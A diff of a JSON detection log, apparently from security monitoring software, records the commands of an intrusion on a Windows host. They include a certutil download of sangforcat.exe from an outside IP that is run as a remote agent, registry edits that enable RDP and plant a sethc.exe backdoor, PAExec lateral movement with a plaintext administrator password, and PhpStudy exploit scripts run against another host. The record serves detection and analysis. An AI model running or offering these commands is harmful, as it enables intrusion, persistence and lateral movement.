@@ -1,927 +1,837 @@
 {
     "commands": [
         {
-            "label": "ipconfig",
-            "stage": "null",
-            "raw_cmd": "ipconfig",
-            "id": "8d40d4461bb8935b0e783328148798d2",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "\"cmd.exe /c  taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/\\\nagent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:\\\n8443 \"",
+            "description": "Forcefully terminates the agent.exe process, downloads and runs a file (sangforcat.exe) from a remote server, and connects to a specified server for further actions.",
+            "label": "cmd.exe /c  ipconfig",
             "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
             "id": "7acd487c31c9e4d993187f2c59784e6a",
             "score": "52.6",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": []
         },
         {
-            "label": "/??/C:/Windows/system32/conhost.exe 0xffffffff",
-            "stage": "null",
-            "raw_cmd": "conhost",
-            "id": "ab389e7fcd9b6064e0fcfdd0bea3e93f",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "",
+            "description": "null",
+            "label": "null",
             "stage": "Establish Foothold",
             "raw_cmd": "",
             "id": "f237e928b509fb6da44887c695c5790d",
             "score": "42.4",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": []
         },
         {
-            "label": "\"cmd.exe /c  taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/\\\nagent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:\\\n8443 \"",
+            "description": "Forcefully terminates the agent.exe process, downloads and runs a file (sangforcat.exe) from a remote server, and connects to a specified server for further actions.",
+            "label": "cmd.exe /c  whoami&amp;arp -a&amp;ipconfig&amp;ping www.baidu.com -c 1",
             "stage": "Establish Foothold",
+            "raw_cmd": "cmd",
             "id": "0e82ab1459acc722c0bc228d9de98ee1",
             "score": "52.6",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": []
         },
         {
+            "description": "Forcefully terminates the agent.exe process, downloads and runs a file (sangforcat.exe) from a remote server, and connects to a specified server for further actions.",
             "label": "cmd.exe /c  taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/agent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
             "stage": "Establish Foothold",
             "raw_cmd": "cmd",
             "id": "f4106fd012d36c419884c078bfa0d7d8",
             "score": "52.6",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": []
         },
         {
-            "label": "arp  -a",
-            "stage": "null",
-            "raw_cmd": "ARP",
-            "id": "8d5876fd1d2342bd981143797153f006",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "/??/C:/Windows/system32/conhost.exe 0xffffffff",
-            "stage": "null",
-            "raw_cmd": "conhost",
-            "id": "b0e496fea9037828f95de4e56475af09",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "ipconfig",
-            "stage": "null",
-            "raw_cmd": "ipconfig",
-            "id": "daecd374f068945e34be31e6b7de1a9d",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "ping  www.baidu.com -c 1",
-            "stage": "null",
-            "raw_cmd": "PING",
-            "id": "df3823b768e608b4ad4efdd1a2162380",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "whoami",
-            "stage": "null",
-            "raw_cmd": "whoami",
-            "id": "ed943872fded9d22497946e84a54b48c",
-            "score": "0",
-            "type": "command"
-        },
-        {
+            "description": "null",
             "label": "cmd  /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
             "stage": "Establish Foothold",
             "raw_cmd": "cmd",
             "id": "0e881c511f479048c410c13ed48be35d",
             "score": "14.4",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Public/agent.exe\\\"\""
+            ]
         },
         {
-            "label": "",
+            "description": "null",
+            "label": "certutil",
             "stage": "Establish Foothold",
             "raw_cmd": "certutil",
             "id": "77d192d3aa3b53fa32ca4e97fa20733d",
             "score": "14.4",
-            "type": "command"
+            "type": "command",
+            "ip": [
+                "192.168.0.95:50753->124.223.85.207:8079",
+                "192.168.0.95:50750->124.223.85.207:8079"
+            ],
+            "filename": [
+                "  C:/Users/Public/agent.exe\\\"\"",
+                "  C:/Users/Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/7D6D5BC99FBAD78A324FC7E52924C2A8\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/INetCache/IE/69T5JAAG/sangforcat[2].exe\\\"\"",
+                "  C:/Users/Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/7D6D5BC99FBAD78A324FC7E52924C2A8\\\"\""
+            ]
         },
         {
+            "description": "null",
             "label": "taskkill  /f /im agent.exe",
             "stage": "Establish Foothold",
             "raw_cmd": "taskkill",
             "id": "ba0c5316e6fa54216acc9110ce3fc5d8",
             "score": "14.4",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": []
         },
         {
+            "description": "null",
             "label": "/??/C:/Windows/system32/conhost.exe 0xffffffff",
             "stage": "Establish Foothold",
             "raw_cmd": "conhost",
             "id": "ff5668a1817970682211c4f6a6185960",
             "score": "14.4",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": []
         },
         {
-            "label": "",
+            "description": "null",
+            "label": "agent",
             "stage": "Establish Foothold",
             "raw_cmd": "agent",
             "id": "c88f5ef37edb18c47c1d5d0093d5f886",
             "score": "449.2",
-            "type": "command"
+            "type": "command",
+            "ip": [
+                "192.168.0.95:50755->124.223.85.207:8443"
+            ],
+            "filename": [
+                "  C:/Users/Public/agent.exe\\\"\"",
+                "  C:/Users/Public/administrator_pass.txt\\\"\"",
+                "  C:/Users/Public/PhpStudyPoc.py\\\"\"",
+                "  C:/Users/Public/PhpStudyExp2.py\\\"\"",
+                "  C:/Users/Public/PAExec.exe\\\"\"",
+                "  C:/Users/Public/nbtscan.exe\\\"\"",
+                "  C:/Users/Public/WinBrute.exe\\\"\""
+            ]
         },
         {
+            "description": "null",
             "label": "powershell.exe -ExecutionPolicy Bypass -C  reg add / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/  /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=/ Remote Desktop/  dir=in action=allow protocol=TCP localport=3389;reg query / HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Terminal Server/ ;REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/cmd.exe/",
             "stage": "null",
             "raw_cmd": "powershell",
             "id": "04123a0c0bbbc0b2ded650454ed22d10",
             "score": "0",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Documents/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Downloads/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/Application Shortcuts/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/590aee7bdd69b59b.customDestinations-ms\\\"\"",
+                "  C:/Users/Administrator/Music/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/System Tools/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Videos/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Pictures/desktop.ini\\\"\"",
+                "  C:/Users/Public/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/2MRF9BGPXM9FKVZ6C0Q0.temp\\\"\""
+            ]
         },
         {
-            "label": "/c echo end:78cfa46d-d648-44ac-9ed8-ee7469cb82c2",
+            "description": "null",
+            "label": "/c nbtscan.exe 192.168.0.244/24",
             "stage": "null",
             "raw_cmd": "cmd",
-            "id": "0f8a0169d64fc33f1fe3e36a55191779",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "/c del /f /q PhpStudyPoc.py",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "19e5ea525891815fa367089bbc2d8c03",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "\"/c del /f /q PAExec.exe\"",
-            "stage": "null",
             "id": "1ab9d0e544961427073a276ee608b822",
             "score": "0",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Public/nbtscan.exe\\\"\""
+            ]
         },
         {
+            "description": "null",
             "label": "powershell.exe -ExecutionPolicy Bypass -C  REG ADD / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/  /v Debugger /t REG_SZ /d / C:/windows/system32/sethc.exe/  /f;REG query / HKLM/SOFTWARE/Microsoft/Windows NT/CurrentVersion/Image File Execution Options/sethc.exe/",
             "stage": "null",
             "raw_cmd": "powershell",
             "id": "1bbe83746c4dc7bd98a5b1898d4e97a6",
             "score": "0",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Documents/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Downloads/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/Application Shortcuts/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/590aee7bdd69b59b.customDestinations-ms\\\"\"",
+                "  C:/Users/Administrator/Music/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/System Tools/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Videos/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Pictures/desktop.ini\\\"\"",
+                "  C:/Users/Public/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/BYJOWPQW9QGG4DFAL2S4.temp\\\"\""
+            ]
         },
         {
+            "description": "null",
             "label": "powershell.exe -ExecutionPolicy Bypass -C  cmd /c &apos;python PhpStudyExp2.py http://121.36.30.176/ / taskkill /f /im agent.exe&amp;certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:/Users/Public/agent.exe&amp;cmd /c start /min C:/Users/Public/agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443/ &apos;",
             "stage": "null",
             "raw_cmd": "powershell",
             "id": "224ed451937e268f150946b3ae48c27d",
             "score": "0",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Documents/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Downloads/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/Application Shortcuts/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/590aee7bdd69b59b.customDestinations-ms\\\"\"",
+                "  C:/Users/Administrator/Music/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/System Tools/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Videos/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Pictures/desktop.ini\\\"\"",
+                "  C:/Users/Public/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/C1SY1RQJZPQJ1EXGL80N.temp\\\"\""
+            ]
         },
         {
-            "label": "/c del /f /q WinBrute.exe &amp;&amp; del /f /q administrator_pass.txt",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "2747d3b948ba7b25711cfa8ece998ff5",
-            "score": "0",
-            "type": "command"
-        },
-        {
-            "label": "/c python PhpStudyPoc.py http://121.36.30.176/",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "34adc0f4600038b5490d2173d0d2e0b1",
-            "score": "0",
-            "type": "command"
-        },
-        {
+            "description": "null",
             "label": "powershell.exe -ExecutionPolicy Bypass -C  echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
             "stage": "null",
             "raw_cmd": "powershell",
             "id": "37694d348df6bcce6491d529922d2f52",
             "score": "0",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Documents/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Downloads/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/Application Shortcuts/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/590aee7bdd69b59b.customDestinations-ms\\\"\"",
+                "  C:/Users/Administrator/Music/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/System Tools/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Videos/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Pictures/desktop.ini\\\"\"",
+                "  C:/Users/Public/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/0M3SWYRK54YFWRWSK26V.temp\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_2f1227e0-ab00-43cd-97f8-f4ee011ef97f\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b3f83a6a-820e-4c26-8136-ccd6cf5d5ebb\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheIndex\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b83d2633-0023-4a6d-93a1-791ec67a168f\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_748ce76e-bb6b-4f5c-9dea-2d68f04a23bc\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_034bf43a-7faf-4dfc-986f-9eff6213ef9b\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_6ecece8f-3052-46e5-8f70-5764a15bf1e0\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ab5924a6-0048-40af-b534-6ed9c93e40f1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1be7444e-aacb-4826-beed-3b4106d19982\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_7e913f01-86cd-492e-b792-112164d19fab\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8a23c91a-9c79-49f4-831d-cd5d7c08b88a\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_cef0e298-51a3-4c1e-af05-49f72b10845e\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_9de0acc9-1ac2-4972-973c-67167f8fa73d\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_26baa1b6-754e-420f-8718-61642a64ef7b\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_16af9c7b-6571-4146-b6b2-a9156fdca690\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1b8e200f-e5e1-4e88-9177-78c2207876f3\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_e7fbfa60-c296-4eb6-861c-56be374e1e53\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8e7da960-4be7-417a-abda-514031bd7cfc\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_957d89ad-48db-4635-80f9-df6be3db4f9c\\\"\"",
+                "  C:/windows/system32/windowspowershell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psm1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_109b06e3-2f2f-4c8b-8948-3f6f8cb821b0\\\"\"",
+                "  C:/windows/system32/windowspowershell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psd1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ae07adf4-c8e9-4119-8f68-005853e4b469\\\"\""
+            ]
         },
         {
+            "description": "null",
             "label": "/c PAExec.exe //192.168.0.244 -u administrator -p Data123456! ipconfig",
             "stage": "null",
             "raw_cmd": "cmd",
             "id": "3ba7410a631d244ac45b4971d30e57da",
             "score": "0",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Public/PAExec.exe\\\"\""
+            ]
         },
         {
-            "label": "/c echo start:78cfa46d-d648-44ac-9ed8-ee7469cb82c2",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "493e9ce98c7ab0a0a699abe7106d09b0",
-            "score": "0",
-            "type": "command"
-        },
-        {
+            "description": "null",
             "label": "powershell.exe -ExecutionPolicy Bypass -C  echo end:b7f92752-df34-4b08-9e98-45a3004b94ff",
             "stage": "null",
             "raw_cmd": "powershell",
             "id": "5fb8c454b74cd087c9173797e2a28fe8",
             "score": "0",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Documents/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Downloads/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/Application Shortcuts/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/590aee7bdd69b59b.customDestinations-ms\\\"\"",
+                "  C:/Users/Administrator/Music/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/System Tools/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Videos/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Pictures/desktop.ini\\\"\"",
+                "  C:/Users/Public/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_2f1227e0-ab00-43cd-97f8-f4ee011ef97f\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b3f83a6a-820e-4c26-8136-ccd6cf5d5ebb\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheIndex\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b83d2633-0023-4a6d-93a1-791ec67a168f\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_748ce76e-bb6b-4f5c-9dea-2d68f04a23bc\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_034bf43a-7faf-4dfc-986f-9eff6213ef9b\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_6ecece8f-3052-46e5-8f70-5764a15bf1e0\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ab5924a6-0048-40af-b534-6ed9c93e40f1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1be7444e-aacb-4826-beed-3b4106d19982\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_7e913f01-86cd-492e-b792-112164d19fab\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8a23c91a-9c79-49f4-831d-cd5d7c08b88a\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_cef0e298-51a3-4c1e-af05-49f72b10845e\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_9de0acc9-1ac2-4972-973c-67167f8fa73d\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_26baa1b6-754e-420f-8718-61642a64ef7b\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_16af9c7b-6571-4146-b6b2-a9156fdca690\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_1b8e200f-e5e1-4e88-9177-78c2207876f3\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_e7fbfa60-c296-4eb6-861c-56be374e1e53\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_8e7da960-4be7-417a-abda-514031bd7cfc\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_957d89ad-48db-4635-80f9-df6be3db4f9c\\\"\"",
+                "  C:/windows/system32/windowspowershell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psm1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_109b06e3-2f2f-4c8b-8948-3f6f8cb821b0\\\"\"",
+                "  C:/windows/system32/windowspowershell/v1.0/Modules/Microsoft.PowerShell.Utility/Microsoft.PowerShell.Utility.psd1\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_ae07adf4-c8e9-4119-8f68-005853e4b469\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/EL23LX32GLKP49X84M2N.temp\\\"\""
+            ]
         },
         {
-            "label": "/c echo start:e96998eb-ab9a-4a48-979c-fb68511a6a83",
-            "stage": "null",
-            "raw_cmd": "cmd",
-            "id": "65b6784bf0b757d8dda52d2b7c38db9e",
-            "score": "0",
-            "type": "command"
-        },
-        {
+            "description": "null",
             "label": "powershell.exe -ExecutionPolicy Bypass -C  echo end:f98e6367-e38b-4e53-ba83-c58ede5c85fc",
             "stage": "null",
             "raw_cmd": "powershell",
             "id": "6b94ac37e23ec99f6f0b42ec80ba5292",
             "score": "0",
-            "type": "command"
+            "type": "command",
+            "ip": [],
+            "filename": [
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Documents/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Downloads/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/Application Shortcuts/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/590aee7bdd69b59b.customDestinations-ms\\\"\"",
+                "  C:/Users/Administrator/Music/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/desktop.ini\\\"\"",
+                "  C:/ProgramData/Microsoft/Windows/Start Menu/Programs/System Tools/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Videos/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/Pictures/desktop.ini\\\"\"",
+                "  C:/Users/Public/Desktop/desktop.ini\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_2f1227e0-ab00-43cd-97f8-f4ee011ef97f\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b3f83a6a-820e-4c26-8136-ccd6cf5d5ebb\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheIndex\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_b83d2633-0023-4a6d-93a1-791ec67a168f\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_748ce76e-bb6b-4f5c-9dea-2d68f04a23bc\\\"\"",
+                "  C:/Users/Administrator/AppData/Local/Microsoft/Windows/PowerShell/CommandAnalysis/PowerShell_AnalysisCacheEntry_034bf43a-7faf-4dfc-986f-9eff6213ef9b\\\"\"",
